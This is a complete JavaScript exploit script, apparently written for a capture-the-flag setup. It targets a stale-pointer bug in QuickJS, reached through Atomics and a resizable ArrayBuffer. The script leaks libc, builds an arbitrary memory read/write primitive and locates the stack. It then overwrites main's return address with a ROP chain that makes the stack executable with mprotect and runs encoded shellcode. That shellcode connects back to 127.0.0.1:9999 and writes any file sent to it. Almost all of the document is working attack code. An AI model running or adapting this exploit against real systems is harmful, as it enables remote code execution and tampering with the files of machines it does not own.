'use strict';

// QuickJS Atomics + ResizableArrayBuffer stale pointer exploit -> connectback
// Goal: connect to 127.0.0.1:9999, receive <u32 fnlen><fn><u32 clen><content>, write file.
//
// Strategy (no std/os modules, Full RELRO, seccomp blocks exec/fork):
// 1) Leak a libc pointer via unsorted-bin metadata using the stale pointer read.
// 2) Corrupt a BigUint64Array JSObject's internal data pointer (u.ptr) to get arbitrary r/w.
// 3) Find libc base by scanning for ELF header.
// 4) Find the initial stack via libc GOT entry for _dl_argv.
// 5) Find main's saved return address on the stack.
// 6) Overwrite it with a small ROP chain calling mprotect(stack_page, 0x2000, RWX)
//    and jumping to stack-resident shellcode.
// 7) Shellcode performs socket/connect/read/openat/write/close/exit.

const U64_MASK = (1n << 64n) - 1n;
function u64(x) { return x & U64_MASK; }

// -------------------- 1) libc pointer leak via unsorted-bin fd --------------------
function leak_libc_ptr() {
  const L1 = 0x3000;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);
  let evil = { valueOf() { rab.resize(L2); return 0n; } };
  // index 6 -> offset 0x30 (first qword in freed remainder's user-data = unsorted fd)
  return u64(Atomics.add(ta, 6, evil));
}

// -------------------- 2) corrupt TypedArray u.ptr -> arbitrary u64 read/write --------------------
function make_arb_u64_view(base_addr, backing_bytes) {
  let backing = new ArrayBuffer(backing_bytes);
  let victim = null;

  const L1 = 0x70;
  const L2 = 0x20;
  let rab = new ArrayBuffer(L1, { maxByteLength: L1 });
  let ta = new BigInt64Array(rab);

  // Some extra allocations to stabilize reuse (optional)
  let spray = [];
  for (let i = 0; i < 50; i++) spray.push(new ArrayBuffer(0x40));

  let evil = {
    valueOf() {
      rab.resize(L2);
      // Allocate the victim typed array object after the shrink, aiming to land
      // its JSObject in the freed remainder.
      victim = new BigUint64Array(backing);
      return base_addr;
    }
  };

  // stale ptr offset 13*8 = 0x68 overlaps JSObject.u.array.u.ptr
  Atomics.store(ta, 13, evil);
  if (victim === null)
    throw new Error('failed to create victim');
  return { backing, victim, base: base_addr };
}

// -------------------- 3) find libc base by scanning for ELF header --------------------
function find_libc_base(leak) {
  let leakPage = leak & ~0xfffn;
  const scan = 0x400000; // 4MB
  let start = leakPage - BigInt(scan);

  let mem = make_arb_u64_view(start & ~7n, scan + 0x2000);
  for (let off = scan; off >= 0; off -= 0x1000) {
    let w = mem.victim[off >> 3];
    if ((w & 0xffffffffn) === 0x464c457fn)
      return (start + BigInt(off)) & ~0xfffn;
  }
  return 0n;
}

// -------------------- constants for glibc 2.41 (offsets from libc base) --------------------
const OFF_RET = 0x2846bn;
const OFF_POP_RDI_RET = 0x2a145n;
const OFF_POP_RSI_RET = 0x2baa9n;
const OFF_POP_RDX_POP_RBX_RET = 0x8f0c5n;
const OFF_MPROTECT = 0x10d620n;

const OFF__dl_argv_GOT = 0x1e6dd0n;
const OFF_MAIN_RETADDR_VALUE = 0x29ca8n;

// -------------------- shellcode (x86_64 Linux) placed on stack --------------------
// Connectback: connect to 127.0.0.1:9999, receive filename+content, write file
// Features: proper read loops handling partial reads, error handling (exit 1 on failure)
//
// Disassembly (x86-64, Intel syntax):
//
// === socket(AF_INET, SOCK_STREAM, 0) ===
//   0: xor    eax,eax              ; clear eax
//   2: mov    al,0x29              ; syscall 41 = socket
//   4: mov    edi,0x2              ; domain = AF_INET
//   9: mov    esi,0x1              ; type = SOCK_STREAM
//   e: xor    edx,edx              ; protocol = 0
//  10: syscall
//  12: mov    r12,rax              ; save sockfd in r12
//
// === Setup stack frame and sockaddr_in ===
//  15: sub    rsp,0x200            ; allocate 512 bytes
//  1c: mov    rbx,rsp              ; rbx = base pointer for buffers
//  1f: mov    WORD PTR [rbx],0x2   ; sin_family = AF_INET
//  24: mov    WORD PTR [rbx+0x2],0xf27  ; sin_port = 9999 (big-endian)
//  2a: mov    DWORD PTR [rbx+0x4],0x100007f ; sin_addr = 127.0.0.1
//  31: xor    eax,eax
//  33: mov    QWORD PTR [rbx+0x8],rax ; zero padding
//
// === connect(sockfd, &addr, 16) ===
//  37: mov    al,0x2a              ; syscall 42 = connect
//  39: mov    rdi,r12              ; sockfd
//  3c: mov    rsi,rbx              ; addr
//  3f: mov    edx,0x10             ; addrlen = 16
//  44: syscall
//
// === Read filename length (4 bytes) with loop ===
//  46: lea    r13,[rbx+0x20]       ; buf = rbx+0x20
//  4a: mov    r14d,0x4             ; remaining = 4
//  50: xor    eax,eax              ; syscall 0 = read
//  52: mov    rdi,r12              ; sockfd
//  55: mov    rsi,r13              ; buf
//  58: mov    rdx,r14              ; count
//  5b: syscall
//  5d: test   rax,rax              ; check return
//  60: jle    0x146                ; error -> exit(1)
//  66: add    r13,rax              ; buf += bytes_read
//  69: sub    r14,rax              ; remaining -= bytes_read
//  6c: jne    0x50                 ; loop until done
//
// === Read filename (fnlen bytes) with loop ===
//  6e: mov    eax,DWORD PTR [rbx+0x20] ; fnlen
//  71: mov    r15d,eax             ; save fnlen in r15
//  74: lea    r13,[rbx+0x24]       ; buf = rbx+0x24 (filename)
//  78: mov    r14d,r15d            ; remaining = fnlen
//  7b: xor    eax,eax              ; syscall 0 = read
//  7d: mov    rdi,r12
//  80: mov    rsi,r13
//  83: mov    rdx,r14
//  86: syscall
//  88: test   rax,rax
//  8b: jle    0x146                ; error -> exit(1)
//  91: add    r13,rax
//  94: sub    r14,rax
//  97: jne    0x7b                 ; loop until done
//  99: mov    BYTE PTR [rbx+r15*1+0x24],0x0 ; null-terminate filename
//
// === Read content length (4 bytes) with loop ===
//  9f: lea    r13,[rbx+0x80]       ; buf = rbx+0x80
//  a6: mov    r14d,0x4             ; remaining = 4
//  ac: xor    eax,eax              ; read loop...
//  ae: mov    rdi,r12
//  b1: mov    rsi,r13
//  b4: mov    rdx,r14
//  b7: syscall
//  b9: test   rax,rax
//  bc: jle    0x146                ; error -> exit(1)
//  c2: add    r13,rax
//  c5: sub    r14,rax
//  c8: jne    0xac
//
// === Read content (contentlen bytes) with loop ===
//  ca: mov    eax,DWORD PTR [rbx+0x80] ; contentlen
//  d0: mov    r9d,eax              ; save in r9
//  d3: lea    r13,[rbx+0x84]       ; buf = rbx+0x84 (content)
//  da: mov    r14d,r9d             ; remaining = contentlen
//  dd: xor    eax,eax              ; read loop...
//  df: mov    rdi,r12
//  e2: mov    rsi,r13
//  e5: mov    rdx,r14
//  e8: syscall
//  ea: test   rax,rax
//  ed: jle    0x146                ; error -> exit(1)
//  ef: add    r13,rax
//  f2: sub    r14,rax
//  f5: jne    0xdd
//
// === openat(AT_FDCWD, filename, O_WRONLY|O_CREAT|O_TRUNC, 0644) ===
//  f7: mov    eax,0x101            ; syscall 257 = openat
//  fc: mov    edi,0xffffff9c       ; AT_FDCWD (-100)
// 101: lea    rsi,[rbx+0x24]       ; filename
// 105: mov    edx,0x241            ; flags = O_WRONLY|O_CREAT|O_TRUNC
// 10a: mov    r10d,0x1a4           ; mode = 0644
// 110: syscall
// 112: mov    r8,rax               ; save fd in r8
//
// === write(fd, content, contentlen) ===
// 115: mov    eax,0x1              ; syscall 1 = write
// 11a: mov    rdi,r8               ; fd
// 11d: lea    rsi,[rbx+0x84]       ; content
// 124: mov    rdx,r9               ; contentlen
// 127: syscall
//
// === close(fd) ===
// 129: mov    eax,0x3              ; syscall 3 = close
// 12e: mov    rdi,r8               ; fd
// 131: syscall
//
// === close(sockfd) ===
// 133: mov    eax,0x3              ; syscall 3 = close
// 138: mov    rdi,r12              ; sockfd
// 13b: syscall
//
// === exit(0) - success ===
// 13d: mov    eax,0x3c             ; syscall 60 = exit
// 142: xor    edi,edi              ; status = 0
// 144: syscall
//
// === exit(1) - error handler ===
// 146: mov    eax,0x3c             ; syscall 60 = exit
// 14b: mov    edi,0x1              ; status = 1
// 150: syscall
//
const SC_WORDS = [
  0x000002bf29b0c031n,
  0xd23100000001be00n,
  0xec8148c48949050fn,
  0x66e3894800000200n,
  0x0243c766000203c7n,
  0x00007f0443c70f27n,
  0xb008438948c03101n,
  0xbade8948e7894c2an,
  0x8d4c050f00000010n,
  0x00000004be41206bn,
  0xee894ce7894cc031n,
  0xc08548050ff2894cn,
  0x0149000000e08e0fn,
  0x438be275c62949c5n,
  0x246b8d4cc7894120n,
  0xe7894cc031fe8945n,
  0x050ff2894cee894cn,
  0x0000b58e0fc08548n,
  0x75c62949c5014900n,
  0x4c00243b44c642e2n,
  0xbe4100000080ab8dn,
  0x894cc03100000004n,
  0x0ff2894cee894ce7n,
  0x00848e0fc0854805n,
  0xc62949c501490000n,
  0x00000080838be275n,
  0x0084ab8d4cc18941n,
  0x4cc031ce89450000n,
  0xf2894cee894ce789n,
  0x49577ec08548050fn,
  0xb8e675c62949c501n,
  0xffff9cbf00000101n,
  0x0241ba24738d48ffn,
  0x000001a4ba410000n,
  0x0001b8c08949050fn,
  0xb38d48c7894c0000n,
  0x0fca894c00000084n,
  0x894c00000003b805n,
  0x00000003b8050fc7n,
  0x003cb8050fe7894cn,
  0x3cb8050fff310000n,
  0x00000001bf000000n,
  0x909090909090050fn
];

function write_u64(mem, addr, val) {
  // mem: {victim, base}
  let idx = Number((addr - mem.base) >> 3n);
  mem.victim[idx] = u64(val);
}

function pwn() {
  // Leak into libc
  let leak = leak_libc_ptr();
  let libcBase = find_libc_base(leak);
  if (libcBase === 0n) return;

  // Read _dl_argv via libc view
  let libcView = make_arb_u64_view(libcBase, 0x600000);
  let dl_argv_addr = u64(libcView.victim[Number(OFF__dl_argv_GOT >> 3n)]);

  // argv pointer on initial stack
  let ldView = make_arb_u64_view(dl_argv_addr & ~7n, 0x1000);
  let argv_ptr = u64(ldView.victim[0]);

  // Create a stack view ending at argv_ptr
  const stackScan = 0x200000; // 2MB
  let stackBase = (argv_ptr - BigInt(stackScan)) & ~7n;
  let stackView = make_arb_u64_view(stackBase, stackScan);

  // Find the saved return address of main.
  let target_ret_val = libcBase + OFF_MAIN_RETADDR_VALUE;
  let n = stackScan >> 3;
  let ret_i = -1;
  for (let i = n - 4; i >= 0; i--) {
    if (stackView.victim[i] === target_ret_val) { ret_i = i; break; }
  }
  if (ret_i < 0) return;

  let saved_rip_addr = stackBase + BigInt(ret_i * 8);

  // Shellcode location: place code far below the current stack pointer (near stackBase)
  // so we don't smash active interpreter stack frames while still running JS.
  let sc_addr = (stackBase + 0x10000n) + 0x200n;
  let sc_page = sc_addr & ~0xfffn;

  // Write shellcode to stack
  for (let i = 0; i < SC_WORDS.length; i++) {
    write_u64(stackView, sc_addr + BigInt(i * 8), SC_WORDS[i]);
  }

  // ROP chain to mprotect(sc_page, 0x2000, 7) then jump to sc_addr
  let ret = libcBase + OFF_RET;
  let pop_rdi = libcBase + OFF_POP_RDI_RET;
  let pop_rsi = libcBase + OFF_POP_RSI_RET;
  let pop_rdx_rbx = libcBase + OFF_POP_RDX_POP_RBX_RET;
  let mprotect = libcBase + OFF_MPROTECT;

  // Install chain
  let chain = [
    ret,
    pop_rdi, sc_page,
    pop_rsi, 0x2000n,
    pop_rdx_rbx, 7n, 0n,
    mprotect,
    sc_addr,
  ];

  for (let j = 0; j < chain.length; j++) {
    stackView.victim[ret_i + j] = u64(chain[j]);
  }
}

pwn();
